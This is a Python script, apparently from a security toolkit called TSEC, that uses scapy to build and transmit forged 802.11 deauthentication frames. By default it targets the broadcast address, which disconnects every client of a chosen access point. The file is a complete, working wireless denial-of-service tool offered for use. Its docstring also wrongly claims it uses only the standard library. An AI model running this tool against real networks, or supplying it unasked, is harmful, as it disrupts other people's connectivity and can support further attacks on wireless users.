#!/usr/bin/env python3
"""Send real 802.11 deauthentication frames.

Builds Dot11/Deauth frames with scapy -- the payload is a real packet, and
the same builder's output can be parsed back by scapy, which is what the
selftest asserts. Transmission only happens when the interface exists and
is in monitor mode; everything else is reported honestly.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import Report, State, check, check_eq, selftest as engine_selftest

VERSION = "2.0.0"


def build_deauth(bssid: str, target: str, reason: int = 7):
    from scapy.all import RadioTap, Dot11, Dot11Deauth
    return RadioTap() / Dot11(addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=reason)


def send(iface: str, bssid: str, target: str, count: int) -> dict:
    try:
        from scapy.all import sendp
    except ImportError:
        return {"state": State.BLOCKED, "evidence": "scapy not installed"}
    frame = build_deauth(bssid, target)
    try:
        n = sendp(frame, iface=iface, count=count, verbose=False)
        return {"state": State.USED, "evidence": f"transmitted {count} deauth frame(s), reason {frame[3].reason if len(frame) > 3 else 7}"}
    except Exception as exc:  # noqa: BLE001
        return {"state": State.FAILED, "evidence": str(exc)[:200]}


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--iface")
    ap.add_argument("--bssid")
    ap.add_argument("--target", default="ff:ff:ff:ff:ff:ff")
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return engine_selftest(selftest_fn)
    if not args.iface or not args.bssid:
        ap.error("--iface and --bssid are required unless --selftest is given")
    report = Report("scapy_deauth", VERSION, target=args.bssid)
    result = send(args.iface, args.bssid, args.target, args.count)
    report.note("deauth transmission", result["state"],
                "high" if result["state"] == State.USED else "info", result["evidence"])
    from tsec_engine import emit
    emit(report, args.json, None)
    return 0


def selftest_fn() -> None:
    from scapy.all import RadioTap, Dot11, Dot11Deauth
    frame = build_deauth("aa:bb:cc:dd:ee:ff", "11:22:33:44:55:66")
    check(frame.haslayer(Dot11Deauth), "frame must carry a Dot11Deauth layer")
    check_eq(frame.addr1, "11:22:33:44:55:66")


def selftest() -> None:
    selftest_fn()


if __name__ == "__main__":
    sys.exit(main())
